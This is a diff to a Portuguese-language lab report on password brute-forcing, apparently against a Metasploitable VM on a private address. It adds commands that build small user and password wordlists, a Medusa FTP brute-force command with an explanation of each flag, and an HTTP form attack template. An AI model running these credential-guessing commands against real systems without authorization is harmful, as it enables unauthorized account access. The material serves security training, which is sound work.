@@ -18,13 +18,24 @@
 - Medusa, enum4linux, smbclient, curl, netcat, wireshark
 
 ## 4. Wordlists usadas
-- users.txt (5 itens)
-- passwords.txt (6 itens)
-- pass_spray.txt (3 itens)
+- users.txt
+- passwords.txt
 
 ## 5. Comandos Executados
+### Criação de Wordlists
+`echo -e "user\nmsfadmin\nroot\nadmin" > users.txt`
+`echo -e "123456\npassword\nmsfadmin\nqwerty" > passwords.txt`
 ### FTP
 `medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 4 -v 4 | tee medusa_ftp.log`
+- Legenda de flags:
+  - -h alvo
+  - -U arquivo de usuários (linha por linha)
+  - -P arquivo de senhas
+  - -M módulo (ftp, smbnt, http, ssh, etc.)
+  - -t 4 threads (execuções simultâneas)
+  - -v 4 verbose (detalhe de output no terminal)
+
+tee medusa_ftp.log para salvar saída
 
 ### HTTP (template)
 `medusa -h 192.168.56.101 -M http_form -m FORM:... -U users.txt -P passwords.txt -t 6 -v 4 | tee medusa_http.log`
